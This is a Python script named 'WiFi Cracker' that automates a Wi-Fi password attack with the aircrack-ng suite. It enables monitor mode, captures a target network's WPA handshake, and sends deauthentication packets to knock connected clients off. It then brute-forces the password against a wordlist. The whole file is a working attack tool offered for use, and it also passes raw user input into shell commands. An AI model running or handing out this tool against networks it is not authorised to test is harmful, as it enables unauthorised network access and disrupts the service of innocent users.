import subprocess
import time


# ANSI escape codes for colors
class Color:
    BOLD = '\033[1m'
    END = '\033[0m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RED = '\033[91m'

def execute_command(command):
    subprocess.run(command, shell=True)

# Customized banner with color
def print_banner():
    print(f"""{Color.BOLD}{Color.YELLOW}

 __          _______ ______ _____    _____ _____            _____ _  __
 \ \        / /_   _|  ____|_   _|  / ____|  __ \     /\   / ____| |/ /
  \ \  /\  / /  | | | |__    | |   | |    | |__) |   /  \ | |    | ' / 
   \ \/  \/ /   | | |  __|   | |   | |    |  _  /   / /\ \| |    |  <  
    \  /\  /   _| |_| |     _| |_  | |____| | \ \  / ____ \ |____| . \ 
     \/  \/   |_____|_|    |_____|  \_____|_|  \_\/_/    \_\_____|_|\
                                                                     _\
                                                                                                                                                                                           
                        Developed by: Ankit Singh
                        Tool Name: WiFi Cracker
{Color.END}""")

print_banner()



# 1. airmon-ng check kill
execute_command("airmon-ng check kill")

# 2. Wait for 2 seconds
time.sleep(2)

# 3. Enabling monitor mode
execute_command("airmon-ng start wlan0")

# 4. Wait for 2 seconds
time.sleep(2)

# 5. Prompt user to open a new terminal and run "airodump-ng wlan0"
print_banner()
print(f"{Color.BOLD}{Color.CYAN}Please open a new terminal window and run the following command:")
print("airodump-ng wlan0")
input("Press Enter when you've finished running the command..." + Color.END)

# Assume the user has gathered the required information
bssid = input(f"{Color.BOLD}Enter BSSID: {Color.END}")
ch = input(f"{Color.BOLD}Enter CH: {Color.END}")

# 6. Wait for 2 seconds
time.sleep(2)

# 7. Run airodump-ng with provided BSSID and CH in a new terminal
print_banner()
print(f"{Color.BOLD}{Color.CYAN}Open a new terminal and run this command:")
print(f"airodump-ng --bssid {bssid} -c {ch} wlan0 -w hand_shake")
input("Press Enter when you're done..." + Color.END)

# 8. Wait for 2 seconds
time.sleep(2)

# 9. Print "Disconnect host from WiFi"
print_banner()
print(f"{Color.BOLD}{Color.CYAN}Disconnect host from WiFi{Color.END}")

# 10. Deauthenticating host from WiFi
execute_command(f"aireplay-ng --deauth 10 -a {bssid} wlan0")

# 11. Wait for 2 seconds
time.sleep(2)

# 12. Print "Giving the result"
print_banner()
print(f"{Color.BOLD}{Color.CYAN}Giving the result{Color.END}")
wordlist = input(f"{Color.BOLD}Enter full path of wordlist (press Tab for autocomplete): {Color.END}")

execute_command(f"aircrack-ng --bssid {bssid} wlan0 -w {wordlist} hand_shake*.cap")

